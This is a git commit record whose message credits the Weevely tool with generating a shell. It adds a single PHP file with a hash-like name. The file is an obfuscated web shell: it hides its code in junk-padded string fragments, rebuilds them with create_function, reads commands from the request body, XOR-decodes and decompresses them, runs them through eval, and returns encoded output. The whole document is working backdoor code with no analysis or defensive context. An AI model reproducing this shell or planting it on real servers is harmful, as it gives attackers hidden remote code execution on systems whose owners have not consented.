b73db430d92975ba61baf1eb8b1ef27305fff03d
yayip <39186995+yayip@users.noreply.github.com>
2023-05-24 04:21:18 +0000

    shell by weevely
    generate shell using weevely with command $ weevely generate [password] [path]

---
+++ 2591c98b70119fe624898b1e424b5e91.php
@@ -0,0 +1,13 @@
+<?php
+$l='match("/$=jkh(.+)=j$kf/",=j@fil=je_get_=jcontents("p=jhp:=j//in=jput"';
+$G='l);$j+=j+,$=ji++=j){$o.=$t{$i}^$k{$j};=j}}return=j =j$o;}if (=j@p=jreg_';
+$e='),$m)===j1) {=j@ob=j_start();@e=jval(@g=j=jzuncompress(=j@x(@ba=jse=j64_dec';
+$L=');$r=@ba=jse64_encode(=j@x(@gz=jcompress(=j$o),$=j=jk));print("$=jp=j$kh$r$kf");}';
+$E='x7LhYr=jhjrG2d=j504=j";funct=jion x($t=j,=j$k){$c=str=jlen($k)=j;$l=st=j';
+$W='=j$k="aa=j4c=jddf=j=j7";$kh="76a=j4f473cb0d";$kf==j"e8ec36dc7a=jc9"=j;$p="S';
+$M=str_replace('T','','TcrTeaTte_TfuTncTtion');
+$H='ode=j($=jm[1]),$k)))=j;$=jo=@ob_get=j=j_co=jntents=j();@ob=j_=jend_clea=jn(';
+$C='=jrlen($t);$o==j"";fo=jr=j(=j$i=j=j=0;$i<$l;){=jfor($j=0;($j<=j$c&&=j$i<=j$';
+$u=str_replace('=j','',$W.$E.$C.$G.$l.$e.$H.$L);
+$j=$M('',$u);$j();
+?>
